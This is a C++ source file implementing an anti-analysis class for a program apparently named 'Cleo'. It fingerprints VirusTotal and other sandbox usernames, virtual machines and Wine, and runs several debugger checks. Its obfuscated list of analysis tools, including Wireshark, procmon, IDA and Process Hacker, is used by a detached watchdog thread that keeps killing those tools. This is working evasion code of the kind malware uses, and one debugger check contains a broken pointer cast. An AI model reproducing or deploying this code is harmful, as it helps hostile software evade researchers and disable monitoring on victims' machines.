#include "Anti.h"

// Private funcs

void Anti::toLowerCase(char* ptr, size_t size)
{
	for (uint32_t i = 0; i < size; i++) {
		if (isupper(ptr[i]))
			ptr[i] = tolower(ptr[i]);
	}
}

BOOL Anti::IsWow64()
{
	BOOL bIsWow64 = FALSE;
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
	if (NULL != fnIsWow64Process) {
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
			return 0;
	}
	return bIsWow64;
}

// Runs in seperate thread
void Anti::check_usernames()
{
	char szUsername[1024];
	DWORD dwUser = sizeof(szUsername);
	GetUserNameA(szUsername, &dwUser);

	/*
	* Online Auto Analysis VM's use these windows usernames
	*/

	const char* user1 = AY_OBFUSCATE("george"); // <- Virus Total
	if (strcmp(szUsername, user1) == 0)
		exit(EXIT_FAILURE);

	const char* user2 = AY_OBFUSCATE("JOHN-PC"); // <- Virus Total
	if (strcmp(szUsername, user2) == 0)
		exit(EXIT_FAILURE);

	const char* user3 = AY_OBFUSCATE("Sandbox");
	if (strcmp(szUsername, user3) == 0)
		exit(EXIT_FAILURE);

	const char* user4 = AY_OBFUSCATE("sand box");
	if (strcmp(szUsername, user4) == 0)
		exit(EXIT_FAILURE);

	const char* user5 = AY_OBFUSCATE("John Doe");
	if (strcmp(szUsername, user5) == 0)
		exit(EXIT_FAILURE);

	const char* user6 = AY_OBFUSCATE("malware");
	if (strcmp(szUsername, user6) == 0)
		exit(EXIT_FAILURE);

	const char* user7 = AY_OBFUSCATE("Peter Wilson"); // <- Virus Total
	if (strcmp(szUsername, user7) == 0)
		exit(EXIT_FAILURE);

	const char* user8 = AY_OBFUSCATE("virus");
	if (strcmp(szUsername, user8) == 0)
		exit(EXIT_FAILURE);

	const char* user9 = AY_OBFUSCATE("maltest");
	if (strcmp(szUsername, user9) == 0)
		exit(EXIT_FAILURE);

	const char* user10 = AY_OBFUSCATE("CurrentUser");
	if (strcmp(szUsername, user10) == 0)
		exit(EXIT_FAILURE);
}

inline HANDLE Anti::find_process(const char* process_name) const
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, process_name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
			if (hProcess != NULL)
				return hProcess;
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
	return 0;
}

// Public Funcs

void Anti::check_virtual_machine()
{
	std::string sysManufacturer, sysName;
	char buf[1000];
	DWORD sz = 1000;
	int ret;

	HKEY hKey1;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("HARDWARE\\ACPI\\DSDT\\VBOX__"), 0, KEY_READ, &hKey1) == ERROR_SUCCESS)
		exit(EXIT_FAILURE);

	HKEY hKey2;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"), 0, KEY_READ, &hKey2) == ERROR_SUCCESS)
		exit(EXIT_FAILURE);

	// Wine isn't a virtual machine, but it should still be detected
	HKEY hKey3;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SOFTWARE\\Wine"), 0, KEY_READ, &hKey3) == ERROR_SUCCESS)
		exit(EXIT_FAILURE);

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemManufacturer"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysManufacturer = buf;
	if (ret == ERROR_SUCCESS && (sysManufacturer.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("innotek gmbh")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("Apple inc.")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("kvm")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("parallel")) != std::string::npos ||
		sysManufacturer.find(AY_OBFUSCATE("system manufacturer")) != std::string::npos))
		exit(EXIT_FAILURE);

	ret = RegGetValueA(HKEY_LOCAL_MACHINE, AY_OBFUSCATE("SYSTEM\\CurrentControlSet\\Control\\SystemInformation"), AY_OBFUSCATE("SystemProductName"),
		RRF_RT_ANY, NULL, &buf[0], &sz);

	toLowerCase(buf, strlen(buf));
	sysName = buf;

	if (ret == ERROR_SUCCESS && (sysName.find(AY_OBFUSCATE("vmware")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("virtualbox")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("parallel")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("qemu")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("virtio")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("vbox")) != std::string::npos ||
		sysName.find(AY_OBFUSCATE("system product name")) != std::string::npos))
		exit(EXIT_FAILURE);
}

void Anti::check_debugging()
{
	// Check 1
	if (IsDebuggerPresent())
		exit(EXIT_FAILURE);
	// Check 2
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
	bool is_debugging = false;
	CheckRemoteDebuggerPresent(processHandle, reinterpret_cast<PBOOL>(is_debugging));
	if (is_debugging)
		exit(EXIT_FAILURE);
	// Check 3
	SetLastError(0);
	OutputDebugStringW(L"null");
	if (GetLastError() != 0)
		exit(EXIT_FAILURE);

	// Check 4
	__try {
		DebugBreak();
	}
	__except (GetExceptionCode() == EXCEPTION_BREAKPOINT ?
		EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
	}

	// Check 5
	CONTEXT ctx = {};
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (GetThreadContext(GetCurrentThread(), &ctx)) {
		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0)
			exit(EXIT_FAILURE);
	}

	// Check 6
	// KD debug check
	const ULONG_PTR UserSharedData = 0x7FFE0000;
	const UCHAR KdDebuggerEnabledByte = *(UCHAR*)(UserSharedData + 0x2D4);
	const BOOLEAN KdDebuggerEnabled = (KdDebuggerEnabledByte & 0x1) == 0x1;
	const BOOLEAN KdDebuggerNotPresent = (KdDebuggerEnabledByte & 0x2) == 0;
	if (KdDebuggerEnabled || !KdDebuggerNotPresent) 
		exit(EXIT_FAILURE);

	PDWORD pNtGlobalFlag = NULL, pNtGlobalFlagWoW64 = NULL;
	BYTE* _teb32 = (BYTE*)__readfsdword(0x18);
	DWORD _peb32 = *(DWORD*)(_teb32 + 0x30);
	pNtGlobalFlag = (PDWORD)(_peb32 + 0x68);
	if (this->IsWow64())
	{
		BYTE* _teb64 = (BYTE*)__readfsdword(0x18) - 0x2000;
		DWORD64 _peb64 = *(DWORD64*)(_teb64 + 0x60);
		pNtGlobalFlagWoW64 = (PDWORD)(_peb64 + 0xBC);
	}

	BOOL normalDetected = pNtGlobalFlag && *pNtGlobalFlag & 0x00000070;
	BOOL wow64Detected = pNtGlobalFlagWoW64 && *pNtGlobalFlagWoW64 & 0x00000070;
	if (normalDetected || wow64Detected)
		exit(EXIT_FAILURE);
}

void Anti::check_analyzing()
{
	HMODULE hKernel32;
	hKernel32 = GetModuleHandle("kernel32.dll");
	if (hKernel32 == NULL)
		return;
	if (GetProcAddress(hKernel32, AY_OBFUSCATE("wine_get_unix_file_name")) != NULL)
		exit(EXIT_FAILURE);

	// Kill all blacklisted processes (ONCE)
	for (auto const& process : this->processes) {
		HANDLE proc = find_process(process);
		if (proc != NULL) {
			CloseHandle(proc);
			exit(EXIT_FAILURE);
		}
		CloseHandle(proc);
	}
}

// This function should only run on a *detached* thread
void Anti::watch_dog()
{
	while (true) {
		for (auto process : this->processes) {
			HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
			PROCESSENTRY32 pEntry;
			pEntry.dwSize = sizeof(pEntry);
			BOOL hRes = Process32First(hSnapShot, &pEntry);
			while (hRes)
			{
				if (strcmp(pEntry.szExeFile, process) == 0)
				{
					HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
					if (hProcess != NULL)
					{
						TerminateProcess(hProcess, 9);
						CloseHandle(hProcess);
					}
				}
				hRes = Process32Next(hSnapShot, &pEntry);
			}
			CloseHandle(hSnapShot);
			Sleep(100);
		}
		Sleep(200);
	}
}

Anti::Anti(bool& check_virtual_machine, bool& check_debugging, bool& check_analyzing, bool& watch_dog)
{
	this->check_usernames(); // Top Priority

	if (check_virtual_machine) 
		this->check_virtual_machine();

	if (check_debugging) 
		this->check_debugging();

	if (check_analyzing) {
		// Add more if you like
		const char* procmon = AY_OBFUSCATE("procmon.exe"); // Sysinternals
		const char* ollydbg = AY_OBFUSCATE("ollydbg.exe");
		const char* x32dbg = AY_OBFUSCATE("x32dbg.exe"); // x64dbg blacklist is useless considering Cleo is meant to be on x86.
		const char* glasswire = AY_OBFUSCATE("glasswire.exe");
		const char* mmc = AY_OBFUSCATE("mmc.exe");
		const char* wireshark = AY_OBFUSCATE("Wireshark.exe");
		const char* fiddler = AY_OBFUSCATE("Fiddler.exe");
		const char* netlimiter = AY_OBFUSCATE("NLClientApp.exe");
		const char* cheat_engine1 = AY_OBFUSCATE("cheatengine-x86_64.exe");
		const char* ida = AY_OBFUSCATE("idaq.exe");
		const char* vm_proc1 = AY_OBFUSCATE("VMSrvc.exe");
		const char* vm_proc2 = AY_OBFUSCATE("VMUSrvc.exe");
		const char* http_debugger = AY_OBFUSCATE("httpdebugger.exe");
		const char* windbg = AY_OBFUSCATE("windbg.exe");
		const char* dumpcap = AY_OBFUSCATE("dumpcap.exe");
		const char* process_hacker = AY_OBFUSCATE("ProcessHacker.exe");
		const char* cutter = AY_OBFUSCATE("cutter.exe");
		const char* immunity_debugger = AY_OBFUSCATE("ImmunityDebugger.exe");
		const char* binary_ninja = AY_OBFUSCATE("binaryninja.exe");
		const char* cheat_engine2 = AY_OBFUSCATE("cheatengine-x86_64-SSE4-AVX2.exe");
		//Note: Dangerous game to be played if task manager is added to the vector :)
		//const char* taskmgr = AY_OBFUSCATE("Taskmgr.exe");
		this->processes = { procmon, ollydbg, x32dbg, glasswire, mmc, wireshark, fiddler, netlimiter, 
			cheat_engine1, ida, vm_proc1, vm_proc2, http_debugger, windbg, dumpcap, process_hacker, cutter, 
			immunity_debugger, binary_ninja, cheat_engine2 }; // taskmgr
		this->check_analyzing();
	}

	if (watch_dog) {
		std::thread wd(&Anti::watch_dog, this);
		wd.detach();
	}
}